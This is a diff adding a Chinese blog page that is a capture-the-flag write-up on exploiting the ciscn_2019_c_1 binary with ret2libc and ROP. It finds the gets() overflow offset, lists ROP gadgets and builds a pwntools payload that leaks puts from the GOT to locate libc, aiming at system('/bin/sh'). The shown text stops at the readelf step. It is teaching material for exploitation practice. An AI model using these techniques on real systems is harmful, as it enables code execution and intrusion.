@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="arch3rn4r">
+    
+    <title>
+        
+            从ciscn_2019_c_1看ret2libc |
+        
+        arch3rn4r
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/brands.min.css">
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"arch3rn4r.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"arch3rn4r","author":"arch3rn4r","avatar":"/images/beauty/myhead.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","about":"/about                || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/beauty/bg.jpg","background_img_dark":"https://arch3rn4r.github.io/picx-images-hosting/20240915/EYnModKVcAAy6sw.4g4g8oqoi0.webp","description":"这里是雨季，你那里阳光明媚吗","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":"ture"},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default","code_block_shrink":false},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":"arch3rn4r/arch3rn4r.github.io","repo_id":"R_kgDOLnMFhw","category":"Announcements","category_id":"DIC_kwDOLnMFh84Cik-D","reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null]},"root":"","source_data":{},"version":"4.2.3"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="arch3rn4r" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+            <a class="site-name border-box" href="/">
+               arch3rn4r
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        从ciscn_2019_c_1看ret2libc
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/beauty/myhead.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">arch3rn4r</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-09-26 14:25:00</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Fri May 02 2025 10:41:59 GMT+0800">2025-05-02 10:41:59</span>
+            </span>
+        
+
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4k 字</span>
+            </span>
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="前置分析"><a href="#前置分析" class="headerlink" title="前置分析"></a>前置分析</h2><p>检查保护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec <span class="string">&#x27;/home/pwn/ciscn_2019_c_1&#x27;</span> </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/ciscn_2019_c_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>主函数</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.001.70ab0trg2l.webp"
+                       
+                 ></p>
+<p>关键函数，里面有个数组s,然后还有一些过滤和判断，这里是对字符进行分类然后异或</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x60</span> &lt; c &lt;= <span class="number">0x7a</span>:  <span class="comment"># 26个小写英文字母</span></span><br><span class="line">        c = c^<span class="number">0xD</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x40</span> &lt; c &lt;= <span class="number">0x5a</span>:  <span class="comment"># 26个大写英文字母</span></span><br><span class="line">        c = c^<span class="number">0xE</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x2f</span> &lt; c &lt;= <span class="number">0x39</span>:  <span class="comment"># 0-9</span></span><br><span class="line">        c = c^<span class="number">0xF</span></span><br><span class="line">    <span class="comment"># 非数字和英文字母不做处理</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.002.64dtldhu59.webp"
+                       
+                 ></p>
+<p>存在gets函数且没有检查输入，则有机会利用函数进行溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure>
+
+<h2 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h2><h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>首先需要造成溢出，才能去执行构造好的payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">__int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure>
+
+<p>溢出点在gets（s）,所以先要填充0x50+0x8&#x3D;0x58,0x8是函数返回地址</p>
+<p>也可以选择自己计算出溢出量</p>
+<blockquote>
+<p>在pwntools库中，<code>cyclic</code>函数用于生成一个特定的字符串，这个字符串包含了重复的、可预测的模式，这样在缓冲区溢出时可以更容易地找到偏移量。<code>cyclic_find</code>函数则用于在给定的输入中找到特定模式的偏移量。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用pwntool生成循环字符</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(cyclic(<span class="number">128</span>))</span><br><span class="line"><span class="comment"># b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用gdb进行调试</p>
+<p>首先运行程序，发送cyclic字符（aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab）</p>
+<p>出现段错误后获取出现错误的地址，<code>0x400aee</code>,查看程序视图也可以得出0x400aee是encrypt函数的返回地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$  <span class="string">&#x27;/home/pwn/桌面/ciscn_2019_c_1&#x27;</span>                                                                                                                    </span><br><span class="line">EEEEEEE                            hh      iii                </span><br><span class="line">EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  </span><br><span class="line">EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e </span><br><span class="line">EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  </span><br><span class="line">EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee </span><br><span class="line">====================================================================</span><br><span class="line">Welcome to this Encryption machine</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line"><span class="number">1.</span>Encrypt</span><br><span class="line"><span class="number">2.</span>Decrypt</span><br><span class="line"><span class="number">3.</span>Exit</span><br><span class="line">Input your choice!</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Input your Plaintext to be encrypted</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab</span><br><span class="line">Ciphertext</span><br><span class="line">llllolllnlllilllhlllkllljlllellldlllglllflllalll`lllclllblll&#125;lll|llllll~lllylllxlll&#123;lllzlllullltlllwlloollonlloillohllokllojllo</span><br><span class="line">段错误</span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ dmesg |tail -n1                                                                                                                                                        </span><br><span class="line">[ <span class="number">3660.583627</span>] traps: ciscn_2019_c_1[<span class="number">30910</span>] general protection fault ip:400aee sp:7fffc2f5aab8 error:<span class="number">0</span> <span class="keyword">in</span> ciscn_2019_c_1[<span class="number">400000</span>+<span class="number">2000</span>]</span><br></pre></td></tr></table></figure>
+
+<p>使用gdb,按照上面的流程运行程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb ./ciscn_2019_c_1  </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; x/gx $rsp</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x6c6c6c756c6c6c7a</span></span><br><span class="line">pwndbg&gt; x/s $rsp</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="string">&quot;zlllullltlllwlloollonlloillohllokllojllo&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后开始处理得到的数据zlllullltlllwlloollonlloillohllokllojllo，最终计算得出偏移大小为88，也就是0x58</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进行异或，因为encrypt函数会对输入的小写字母进行^0xD</span></span><br><span class="line">original_string = <span class="string">&quot;zlllullltlllwlloollonlloillohllokllojllo&quot;</span>  <span class="comment">#这串字符将在gdb调试中获得</span></span><br><span class="line">xor_value = <span class="number">0xD</span></span><br><span class="line">first_xor = xor_string(original_string, xor_value)</span><br><span class="line"><span class="built_in">print</span>(first_xor)</span><br><span class="line"><span class="comment">#waaa</span></span><br><span class="line"><span class="built_in">print</span>(cyclic_find(<span class="string">&#x27;waaa&#x27;</span>))</span><br><span class="line"><span class="comment">#88</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2libc和ROP"><a href="#ret2libc和ROP" class="headerlink" title="ret2libc和ROP"></a>ret2libc和ROP</h3><p><strong>怎么利用？</strong></p>
+<p>在前面的分析中，可以得知，这些函数本身并不存在后门函数，既system()，”&#x2F;bin&#x2F;sh“，execve（）之类,在这种情况下怎么利用呢？当然是跳出原文件限制，转而去利用原文件运行时链接的libc库，通过泄露libc地址来调用system或execve函数。</p>
+<p><strong>ret2libc</strong> 是一种<strong>绕过栈不可执行（NX bit）保护的攻击技术</strong>，主要用于通过标准 C 库（libc）<strong>中的函数，</strong><code>libc.so.6</code>** 是 Linux 系统中的标准 C 库，包含了许多常见的函数。<strong>在 ret2libc 中</strong>，攻击者需要找到 <code>libc</code> 中 <code>system()</code> 函数和 <code>/bin/sh</code> 的地址。攻击者构造的 payload 将会覆盖返回地址为 <code>system()</code> 函数，且栈上紧跟着的参数为 <code>/bin/sh</code>。</p>
+<p><strong>ROP</strong> 是 ret2libc 的进阶形式，主要用于针对更高级别的安全措施，例如地址空间布局随机化（ASLR）。ROP 的核心思想是通过寻找程序中的 短指令序列（<strong>ROP gadget</strong>)，将它们组合起来构成可执行的指令链，从而达到执行恶意代码的目的。就像搭积木一样，找到合适的指令，然后重新组装，利用原有的指令来运行攻击代码。</p>
+<p>在ROP攻击中，每个函数调用（包括ROP gadget）都需要有一个<strong>返回地址</strong>。这是因为在正常的程序执行过程中，<em>函数执行完后会通过栈上的返回地址回到调用它的地方</em>。因此，你的payload必须指定每个函数或gadget执行完后跳转的地址。例如，第一次调用<code>puts</code>时，必须有返回地址<code>main_addr</code>以保证程序不崩溃，而第二次攻击中，<code>system(&quot;/bin/sh&quot;)</code>之后实际上不需要返回，但程序仍然会执行最后的返回操作。</p>
+<p>使用ROPgadget查找 <em>gadgets</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span>                                                             </span><br><span class="line">Gadgets information                                                                                                </span><br><span class="line">============================================================                                                       </span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret                                                   </span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret                                                             </span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret                                                                       </span><br><span class="line">0x0000000000400c82 : pop r15 ; ret                                                                                 </span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret                                         </span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret                                                             </span><br><span class="line">0x00000000004007f0 : pop rbp ; ret                                                                                 </span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret                                                                       </span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure>
+
+<p>可用的gadget<code>0x0000000000400c83 : pop rdi ; ret</code></p>
+<p><strong>如何找到呢？</strong></p>
+<p>libc库的内容是动态装载到进程空间的，里边的函数和变量的地址只能在运行时定位。下面是找到具体地址的步骤。</p>
+<h4 id="1-寻找libc库基址"><a href="#1-寻找libc库基址" class="headerlink" title="1.寻找libc库基址"></a>1.寻找libc库基址</h4><p>这里使用利用puts（）函数来泄露libc基址（也不一定要用puts,用gets也行，这一步是为了计算出libc基址）</p>
+<p><strong>方法1——使用python代码自动获取 （推荐）</strong></p>
+<blockquote>
+<p>由于 ELF 文件的程序在编译时并不知道动态链接库中的函数地址，因此它使用 GOT 和 PLT 来进行延迟绑定（lazy binding）。第一次调用时，PLT 会解决函数地址并存储在 GOT 中，之后所有对该函数的调用都直接从 GOT 中取地址。</p>
+</blockquote>
+<p>GOT 表中存储的 <code>puts</code> 地址是程序运行时实际使用的 <code>puts</code> 函数地址，而这个地址位于 <strong>libc</strong> 中。一旦我们通过 <code>puts</code> 函数输出了 GOT 表中 <code>puts</code> 的实际地址，我们就可以根据已知的 <code>puts</code> 在 libc 中的偏移量，计算出整个 libc 的基址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>) </span><br><span class="line">main_addr = <span class="number">0x400B28</span> </span><br><span class="line">pop_rdi = <span class="number">0x400C83</span>  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]   <span class="comment">#puts 函数在 GOT（Global Offset Table，全局偏移表）中的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]   <span class="comment">#puts 函数在 PLT（Procedure Linkage Table，过程链接表）中的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>payload解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(1) &#x27;1&#x27;*0x58</span><br><span class="line">这是填充数据，用来覆盖栈上到返回地址之间的空间，0x58（88 字节）具体大小是通过调试得出的，它是为了确保接下来的地址恰好覆盖函数返回地址。</span><br><span class="line">(2) p64(pop_rdi)</span><br><span class="line">这是一个 gadget，即一段指令：pop rdi; ret。在 x86-64 架构的调用约定中，rdi 寄存器是用来传递第一个函数参数的。通过这个 gadget，我们将 puts_got 地址放入 rdi 中，作为参数传递给 puts 函数。</span><br><span class="line">(3) p64(puts_got)</span><br><span class="line">这是 puts 函数在 GOT 中的地址。这里的目的是将 puts_got 的地址作为参数传递给 puts 函数。换句话说，puts 函数会将 GOT 表中 puts 函数的地址 打印出来。这是关键一步，它让我们能够知道 puts 函数的实际地址。</span><br><span class="line">(4) p64(puts_plt)</span><br><span class="line">这是 puts 函数在 PLT 中的地址。通过调用 PLT 中的 puts，程序会实际调用 puts 函数，并将我们传入的参数（即 puts_got 中的地址）作为 puts 的输出内容。这样，puts 函数会输出 GOT 表中存储的 puts 函数的真实地址。</span><br><span class="line">(5) p64(main_addr)</span><br><span class="line">在 puts 函数执行完成后，程序返回到主函数 main，从而可以让程序重新执行并等待新的输入。我们利用这一点，在泄露 puts 地址后，重新回到主函数，继续我们的攻击。因为泄露基址只是第一步，接下来还要接着利用基址来执行代码操作</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2——手动查找</strong></p>
+<p>（手动查找时是在本地进行查找，无法获取和靶机一样的环境，因此会因为libc库版本的差异而导致基址不准，所以还是建议使用代码自动获取基址）</p>
+<ol>
+<li>puts()函数在encrypt()函数末尾，<code>disass encrypt</code>找到puts()函数调用的位置</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass encrypt</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> encrypt:</span><br><span class="line">   0x00000000004009a0 &lt;+0&gt;:     push   rbp</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000400ad1 &lt;+305&gt;:   mov    edi,0x400cd5</span><br><span class="line">   0x0000000000400ad6 &lt;+310&gt;:   call   0x4006e0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400adb &lt;+315&gt;:   lea    rax,[rbp-0x50]</span><br><span class="line">   0x0000000000400adf &lt;+319&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000400ae2 &lt;+322&gt;:   call   0x4006e0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400ae7 &lt;+327&gt;:   nop</span><br><span class="line">   0x0000000000400ae8 &lt;+328&gt;:   add    rsp,0x48</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>打断点 <code>b *encrypt+322</code>,然后查看puts（）的<strong>实际地址</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *encrypt+322</span><br><span class="line">Breakpoint 2 at 0x400ae2</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; p puts</span><br><span class="line"><span class="variable">$1</span> = &#123;int (const char *)&#125; 0x7ffff7e36640 &lt;__GI__IO_puts&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>接下来需要知道 <code>puts</code> 在 <code>libc</code> 库中的<strong>偏移量</strong></li>
+</ol>
+<p>可以使用<code>info proc mappings</code>看到libc库的路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info proc mappings</span><br><span class="line">...</span><br><span class="line">      0x7ffff7dbc000     0x7ffff7dbf000     0x3000        0x0  rw-p   </span><br><span class="line">      0x7ffff7dbf000     0x7ffff7de5000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">      0x7ffff7de5000     0x7ffff7f3c000   0x157000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>readelf</code> 或 <code>nm</code> 来查看 <code>libc.so.6</code> 中函数的偏移地址：</p>
